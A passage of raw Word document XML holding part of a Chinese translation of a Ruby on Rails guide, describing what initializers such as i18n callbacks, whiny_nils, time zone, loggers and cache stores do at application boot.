        <w:t xml:space="preserve"> 的代码块。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F03FE72"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i18n.callbacks</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在开发环境中，建立一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>to_prepare</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回调, 如果任何一个本地化文件从最后一次请求之后有更改, 这个回调将会调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>I18n.reload!</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07454C69"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active_support.initialize_whiny_nils</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.whiny_nils</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 true 的情况下引入 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>active_support/whiny_nil</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个文件会输出如下错误：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="3EF92A20" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="08910854" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1878928485"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Called id for nil, which would mistakenly be 4 -- if you really wanted the id of nil, use object_id</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="77D1DC85"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和:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5760"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="717853FA" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4905E4C9"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You have a nil object when you didn't expect it!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0226C046"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You might have expected an instance of Array.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23AAFB53"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The error occurred while evaluating nil.each</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="303A90D6"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active_support.deprecation_behaivor</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为(运行)环境建立废弃报告，默认开发环境为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:log</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">， 生产环境为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:notify</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 测试环境的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:stderr</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。 如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.active_support.deprecation</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 没有设置值，那么这个初始化程序就会提示用户去 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/environments</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里与当前环境对应的文件修改该行(config.active_support.deprecation)。那个值可以是一个数组。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D334B0"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active_support.initialize_time_zone</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 根据 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.tiem_zone</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为应用程序设置默认的时区，默认为 “UTC”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E9920B3"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action_dispatch.configure</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 配置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionDispatch::Http::URL.tld_length</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的值为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_dispatch.tpl_length</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="438847EC"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action_view.cache_asset_ids</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 当 Active Support 加载时，设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionView::Helpers::AssetTagHelper::AssetPatchs.cache_asset_ids</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 但前提是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.cache_classes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 也有加载。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3BFADB"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active_view.javascript_expansions</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 登记由 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.active_view.javascript_expansions</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_view.stylesheet_expansions</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 建立起来的扩展名，这个扩展名可以被 Action View 识别并且在视图中使用.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E138065"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action_controller.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionController::Base.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> — 如果这个还没有设置 — 为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D317E8F"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action_controller.initialize_framework_caches</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionController::Base.cache_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> — 如果它还没有被设置 — 为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.cache</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ED0DB96"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action_controller.set_configs</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 通过使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_controller</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里的设置来建立 Action Controller. 而这个初始化程序是将方法名作为 setters </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>send</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 给 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionController::Base</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并通过它传值来使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_controller</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的设置的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D84E6B3"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action_controller.compile_config_methods</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为指定的配置设置方法初始化，所以它们能被更快的访问。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E935FBC"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active_record.initialize_timezone</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord::Base.time_zone.aware_attributes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 true, 就好像设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord::Base.default_timezone</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 UTC. 当属性从数据库被读取的时候，它们会被转换成由 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Time.zone</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定的时区.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16CC68C5"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active_record.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord::Base.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> — 如果它还没有设置 — 为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ADC0D42"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active_record.set_configs</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 通过使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
